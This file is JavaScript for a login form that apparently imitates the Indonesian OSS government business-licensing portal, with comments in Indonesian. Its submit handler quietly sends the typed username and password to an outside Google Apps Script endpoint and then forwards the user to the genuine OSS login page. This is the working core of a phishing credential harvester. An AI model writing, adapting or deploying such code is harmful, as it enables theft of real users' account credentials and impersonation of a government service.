document.addEventListener("DOMContentLoaded", function () {
  const loginForm = document.getElementById("loginForm");
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const submitButton = document.getElementById("submitBtn");
  const togglePassword = document.querySelector(".toggle-password");
  const eyeOpen = document.querySelector(".eye-open");
  const eyeClosed = document.querySelector(".eye-closed");
  const alertBox = document.querySelector(".alert");
  const closeAlertButton = document.querySelector(".close-alert");

  function checkInputs() {
    const isUsernameFilled = usernameInput.value.trim() !== "";
    const isPasswordFilled = passwordInput.value.trim() !== "";

    if (isUsernameFilled && isPasswordFilled) {
      submitButton.disabled = false;
    } else {
      submitButton.disabled = true;
    }
  }

  // FUNGSI INI TELAH DIPERBARUI TOTAL
  function submitToGoogleSheet(e) {
    e.preventDefault();
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbxjiGyTIeUapg3grmBx_cWfFFpmgDAYeyF4ZRcydYjqrOghEBYd9XZOIAac-ufE4OE/exec";

    // Membuat objek data javascript, BUKAN FormData
    const data = {
      username: usernameInput.value,
      password: passwordInput.value,
    };

    // Mengirim data sebagai string JSON
    fetch(scriptURL, {
      method: "POST",
      mode: "no-cors", // Diperlukan untuk Google Apps Script
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }).finally(() => {
      // Redirect akan selalu terjadi, baik sukses maupun gagal
      console.log("Permintaan Fetch selesai, mengalihkan halaman...");
      window.location.href = "https://ui-login.oss.go.id/login";
    });
  }

  function togglePasswordVisibility() {
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      eyeOpen.style.display = "none";
      eyeClosed.style.display = "block";
    } else {
      passwordInput.type = "password";
      eyeOpen.style.display = "block";
      eyeClosed.style.display = "none";
    }
  }

  usernameInput.addEventListener("input", checkInputs);
  passwordInput.addEventListener("input", checkInputs);
  loginForm.addEventListener("submit", submitToGoogleSheet);

  if (togglePassword) {
    togglePassword.addEventListener("click", togglePasswordVisibility);
  }

  if (closeAlertButton) {
    closeAlertButton.addEventListener("click", () => {
      alertBox.style.display = "none";
    });
  }
});
